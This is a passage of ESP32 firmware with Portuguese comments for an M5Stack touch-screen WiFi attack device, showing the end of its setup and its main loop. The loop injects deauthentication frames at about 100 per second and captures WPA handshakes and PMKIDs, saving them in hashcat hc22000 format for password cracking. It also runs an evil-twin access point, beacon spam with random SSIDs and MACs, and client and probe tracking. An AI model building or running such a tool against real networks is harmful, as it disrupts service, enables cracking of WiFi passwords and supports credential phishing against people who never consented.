  gClientMutex    = xSemaphoreCreateMutex();

  // Inicializa SD — barramento compartilhado com EPD (CLK=14, MISO=13, MOSI=12, CS=4)
  // IMPORTANTE: não reinicializar pinos — M5Unified já gerencia o barramento SPI do EPD.
  // Chamamos SPI.begin() com os pinos corretos; o ESP32 Arduino lida com o bus sharing.
  SPI.begin(SD_CLK, SD_MISO, SD_MOSI, SD_CS);
  gSdReady = SD.begin(SD_CS, SPI, 25000000);
  if (gSdReady) Serial.println("[SD] Cartao SD inicializado.");
  else          Serial.println("[SD] Cartao SD nao encontrado — gravacao desativada.");

  drawBootScreen("Inicializando...");
  delay(2200);
  drawMenu();
}

void loop() {
  M5.update();

  // ── Deauth: envia frame a cada 10ms (~100 pkts/s) ──────
  if (gDeauthRunning && millis() - gLastDeauthTx >= 10) {
    esp_wifi_80211_tx(WIFI_IF_STA, gDeauthFrame, sizeof(gDeauthFrame), false);
    gDeauthPackets++;
    gLastDeauthTx = millis();
  }

  // Refresh da tela de deauth a cada 1s
  if (gState == S_DEAUTH && gDeauthRunning && millis() - gLastDeauthRefresh >= 1000) {
    drawDeauth();
    gLastDeauthRefresh = millis();
  }

  // Handshake capturado: imprime hc22000 no Serial (uma vez) e atualiza tela
  static bool sPrinted = false;
  if (gHandshakeComplete && !sPrinted) {
    sPrinted = true;
    printHc22000();
    saveHandshake();  // grava hc22000 no SD
    if (gState == S_DEAUTH) { drawDeauth(); gLastDeauthRefresh = millis(); }
  }
  if (!gHandshakeComplete) sPrinted = false; // reseta ao iniciar novo alvo

  // ── PMKID: refresh a cada 1s + handler de captura ──────────
  if (gState == S_PMKID && gPmkidRunning && millis() - gLastPmkidRefresh >= 1000) {
    drawPmkid();
    gLastPmkidRefresh = millis();
  }

  static bool sPmkidPrinted = false;
  if (gPmkidFound && !sPmkidPrinted) {
    sPmkidPrinted = true;
    printPmkid();
    savePmkid();
    if (gState == S_PMKID) { drawPmkid(); gLastPmkidRefresh = millis(); }
  }
  if (!gPmkidFound) sPmkidPrinted = false;

  // ── Evil Twin: processa DNS/HTTP + deauth + refresh ──────────
  evilTwinLoop();
  if (gState == S_EVILTWIN && millis() - gLastEvilRefresh >= 1500) {
    drawEviltwin();
    gLastEvilRefresh = millis();
  }

  // ── Beacon Spam: injeta um frame a cada 10ms (~100 beacons/s) ──
  if (gBeaconRunning && millis() - gBeacon.lastTx >= 10) {
    int h = gBeacon.listHead;
    sendBeacon(gBeacon.ssidList[h], gBeacon.macList[h], gBeacon.channel);
    gBeacon.sentCount++;
    gBeacon.lastTx = millis();

    // A cada 30 beacons em modo RANDOM, roda para um novo SSID/MAC
    if (gBeacon.mode == BMODE_RANDOM && gBeacon.sentCount % 30 == 0) {
      int next = (h + 1) % 8;
      generateRandomSSID(gBeacon.ssidList[next], 33);
      generateRandomMAC(gBeacon.macList[next]);
      gBeacon.listHead  = next;
      if (gBeacon.listCount < 8) gBeacon.listCount++;
    }
  }

  // Refresh da tela Beacon a cada 1.5s
  if (gState == S_BEACON && millis() - gLastBeaconRefresh >= 1500) {
    drawBeacon();
    gLastBeaconRefresh = millis();
  }

  // ── Client Tracker: channel hop (somente modo global, 300ms/canal) ──
  if (gClientRunning && !gClientFilterAP && millis() - gClientLastChan > 300) {
    gClientChannel = gClientChannel % 13 + 1;
    esp_wifi_set_channel(gClientChannel, WIFI_SECOND_CHAN_NONE);
    gClientLastChan = millis();
  }

  // Refresh da tela Client a cada 2s se houver novidades (ou sempre se parado)
  if (gState == S_CLIENT && gClientRunning && gClientDirty &&
      millis() - gLastClientRefresh > 2000) {
    drawClient();
    gLastClientRefresh = millis();
    gClientDirty = false;
  }

  // ── Channel hopping do Probe Monitor (250ms por canal)
  if (gProbeRunning && millis() - gLastChanChange > 250) {
    gProbeChannel = gProbeChannel % 13 + 1;
    esp_wifi_set_channel(gProbeChannel, WIFI_SECOND_CHAN_NONE);
    gLastChanChange = millis();
  }

  // Refresh automático da tela de probe (a cada 3s se houver novidades)
  if (gState == S_PROBE && gProbeDirty && millis() - gLastProbeRefresh > 3000) {
    drawProbe();
    gLastProbeRefresh = millis();
    gProbeDirty = false;
  }

  if (M5.Touch.getCount() > 0) {
    auto t = M5.Touch.getDetail(0);
    if (t.wasPressed()) handleTouch(t.x, t.y);
  }
}
